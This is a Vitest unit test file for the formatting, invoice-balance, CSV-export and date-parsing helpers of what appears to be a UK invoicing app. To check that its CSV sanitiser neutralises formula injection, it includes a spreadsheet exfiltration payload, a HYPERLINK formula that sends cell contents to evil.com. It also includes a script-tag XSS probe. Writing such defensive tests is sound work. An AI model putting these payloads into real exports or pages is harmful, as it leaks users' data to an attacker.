import { describe, it, expect } from "vitest";
import { fmt, fmtDate, fmtShort, fmtRelative, dueDelta, escHtml, DEFAULT_REORDER, balanceDue, csvCell, buildCsv, parseLines, parseUkDate, truncationNotice } from "./utils.js";

describe("truncationNotice", () => {
  it("returns null when the full list is shown", () => {
    expect(truncationNotice(30, 30, "products")).toBeNull();
    expect(truncationNotice(50, 20, "rows")).toBeNull(); // shown >= total
    expect(truncationNotice(0, 0)).toBeNull();
  });
  it("returns a 'Showing X of N' caption when truncated", () => {
    expect(truncationNotice(30, 145, "products")).toBe("Showing 30 of 145 products — refine your search or export for the full set.");
  });
  it("defaults the noun to 'rows'", () => {
    expect(truncationNotice(50, 200)).toMatch(/^Showing 50 of 200 rows/);
  });
  it("coerces non-numeric inputs safely", () => {
    expect(truncationNotice(undefined, 10, "x")).toMatch(/Showing 0 of 10 x/);
    expect(truncationNotice(5, undefined)).toBeNull();
  });
});

describe("fmt", () => {
  it("formats numbers as GBP currency", () => {
    expect(fmt(1234.5)).toBe("£1,234.50");
  });
  it("treats null/undefined/0 as £0.00", () => {
    expect(fmt(null)).toBe("£0.00");
    expect(fmt(undefined)).toBe("£0.00");
    expect(fmt(0)).toBe("£0.00");
  });
  it("formats negative numbers", () => {
    expect(fmt(-50)).toBe("-£50.00");
  });
});

describe("fmtDate / fmtShort", () => {
  it("formats a date string", () => {
    expect(fmtDate("2026-06-12")).toBe("12 Jun 2026");
    expect(fmtShort("2026-06-12")).toBe("12 Jun");
  });
  it("returns em dash for falsy input", () => {
    expect(fmtDate(null)).toBe("—");
    expect(fmtShort(undefined)).toBe("—");
  });
});

describe("fmtRelative", () => {
  it("returns Today for the current date", () => {
    const now = new Date();
    expect(fmtRelative(now.toISOString()).line1).toBe("Today");
  });
  it("returns Yesterday for one day ago", () => {
    const d = new Date(Date.now() - 86400000);
    expect(fmtRelative(d.toISOString()).line1).toBe("Yesterday");
  });
  it("returns 'Nd ago' for within a week", () => {
    const d = new Date(Date.now() - 3 * 86400000);
    expect(fmtRelative(d.toISOString()).line1).toBe("3d ago");
  });
  it("returns em dash with empty line2 for falsy input", () => {
    expect(fmtRelative(null)).toEqual({ line1: "—", line2: "" });
  });
});

describe("dueDelta", () => {
  it("returns null for falsy input", () => {
    expect(dueDelta(null)).toBeNull();
  });
  it("returns positive days for a future date", () => {
    const future = new Date(Date.now() + 5 * 86400000);
    expect(dueDelta(future.toISOString())).toBeGreaterThanOrEqual(4);
  });
  it("returns negative days for a past date", () => {
    const past = new Date(Date.now() - 5 * 86400000);
    expect(dueDelta(past.toISOString())).toBeLessThanOrEqual(-4);
  });
});

describe("escHtml", () => {
  it("escapes HTML special characters", () => {
    expect(escHtml(`<script>alert("x")</script>`)).toBe(
      "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;"
    );
  });
  it("escapes ampersands and quotes", () => {
    expect(escHtml(`Tom & Jerry's "show"`)).toBe("Tom &amp; Jerry&#39;s &quot;show&quot;");
  });
  it("handles falsy input", () => {
    expect(escHtml(null)).toBe("");
    expect(escHtml(undefined)).toBe("");
  });
});

describe("DEFAULT_REORDER", () => {
  it("is a positive number", () => {
    expect(DEFAULT_REORDER).toBe(5);
  });
});

describe("balanceDue", () => {
  it("returns 0 for a fully paid invoice — even if a stale balance still says the full amount (the bug)", () => {
    expect(balanceDue({ status: "paid", amount: 100, amount_paid: 100, balance: 0 })).toBe(0);
    expect(balanceDue({ status: "paid", amount: 100, balance: 100 })).toBe(0); // stale balance ignored when paid
    expect(balanceDue({ status: "paid", amount: 100 })).toBe(0);
  });
  it("returns the stored balance for a partial invoice", () => {
    expect(balanceDue({ status: "partial", amount: 100, amount_paid: 60, balance: 40 })).toBe(40);
  });
  it("returns the full amount for a pending invoice with no payments", () => {
    expect(balanceDue({ status: "pending", amount: 100 })).toBe(100);
  });
  it("derives amount − amount_paid when balance is absent (legacy invoices)", () => {
    expect(balanceDue({ status: "pending", amount: 100, amount_paid: 30 })).toBe(70);
    expect(balanceDue({ status: "partial", amount: 250, amount_paid: 100, balance: null })).toBe(150);
  });
  it("parses string numbers from the DB", () => {
    expect(balanceDue({ status: "pending", amount: "100.00", amount_paid: "25" })).toBe(75);
  });
  it("clamps to [0, amount] against corrupt data", () => {
    expect(balanceDue({ status: "partial", amount: 100, balance: -5 })).toBe(0);   // never negative
    expect(balanceDue({ status: "pending", amount: 100, balance: 150 })).toBe(100); // never exceeds amount
  });
  it("returns 0 for a null/undefined invoice", () => {
    expect(balanceDue(null)).toBe(0);
    expect(balanceDue(undefined)).toBe(0);
  });
});

// Audit item #9: CSV export must neutralise formula injection and quote safely.
describe("csvCell", () => {
  it("neutralises a leading = formula", () => {
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
  });
  it("neutralises leading @ and +/- followed by a function", () => {
    expect(csvCell("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
    expect(csvCell("+HYPERLINK(1)")).toBe(`"'+HYPERLINK(1)"`);
    expect(csvCell("-HYPERLINK(1)")).toBe(`"'-HYPERLINK(1)"`); // '-' + non-digit → neutralised
  });
  it("neutralises a classic exfiltration payload", () => {
    expect(csvCell('=HYPERLINK("http://evil.com?"&A1,"click")').startsWith(`"'=`)).toBe(true);
  });
  it("leaves plain numbers and negatives untouched", () => {
    expect(csvCell("1837.50")).toBe(`"1837.50"`);
    expect(csvCell("-5.00")).toBe(`"-5.00"`);
    expect(csvCell(42)).toBe(`"42"`);
  });
  it("leaves a phone number starting with + untouched", () => {
    expect(csvCell("+447911123456")).toBe(`"+447911123456"`);
  });
  it("quotes and escapes commas, quotes and newlines", () => {
    expect(csvCell("Smith, John")).toBe(`"Smith, John"`);
    expect(csvCell('a "quote"')).toBe(`"a ""quote"""`);
    expect(csvCell("line1\nline2")).toBe(`"line1\nline2"`);
  });
  it("handles null/undefined/empty", () => {
    expect(csvCell(null)).toBe(`""`);
    expect(csvCell(undefined)).toBe(`""`);
    expect(csvCell("")).toBe(`""`);
  });
});

describe("buildCsv", () => {
  it("joins a header and rows with CRLF, every cell sanitised", () => {
    const out = buildCsv(["Name", "Amount"], [["=cmd", "10"], ["Smith, J", "-5"]]);
    expect(out).toBe(`"Name","Amount"\r\n"'=cmd","10"\r\n"Smith, J","-5"`);
  });
});

// Audit item #15: a malformed lines string must never throw and blank a report.
describe("parseLines", () => {
  it("parses a JSON string of line items", () => {
    expect(parseLines({ lines: '[{"qty":2}]' })).toEqual([{ qty: 2 }]);
  });
  it("passes through an already-parsed array", () => {
    const arr = [{ qty: 1 }];
    expect(parseLines({ lines: arr })).toBe(arr);
  });
  it("returns [] for malformed JSON instead of throwing", () => {
    expect(parseLines({ lines: "{not json" })).toEqual([]);
    expect(parseLines({ lines: "=SUM(A1)" })).toEqual([]);
  });
  it("returns [] for missing/empty/non-array lines and null invoice", () => {
    expect(parseLines({ lines: null })).toEqual([]);
    expect(parseLines({})).toEqual([]);
    expect(parseLines({ lines: '{"not":"array"}' })).toEqual([]);
    expect(parseLines(null)).toEqual([]);
  });
});

// Audit item #17: UK statements are day-first; new Date() misreads them.
describe("parseUkDate", () => {
  const iso = (d) => d && `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
  it("reads DD/MM/YYYY as day-first (not US month-first)", () => {
    expect(iso(parseUkDate("06/07/2026"))).toBe("2026-07-06");   // 6 July, not 7 June
    expect(iso(parseUkDate("13/06/2026"))).toBe("2026-06-13");   // would be Invalid Date via new Date()
  });
  it("accepts - and . separators and 2-digit years", () => {
    expect(iso(parseUkDate("13-06-2026"))).toBe("2026-06-13");
    expect(iso(parseUkDate("13.06.2026"))).toBe("2026-06-13");
    expect(iso(parseUkDate("13/06/26"))).toBe("2026-06-13");
  });
  it("reads ISO YYYY-MM-DD unambiguously", () => {
    expect(iso(parseUkDate("2026-06-13"))).toBe("2026-06-13");
  });
  it("returns null for empty or nonsense input", () => {
    expect(parseUkDate("")).toBe(null);
    expect(parseUkDate(null)).toBe(null);
    expect(parseUkDate("not a date")).toBe(null);
    expect(parseUkDate("45/45/2026")).toBe(null);
  });
});
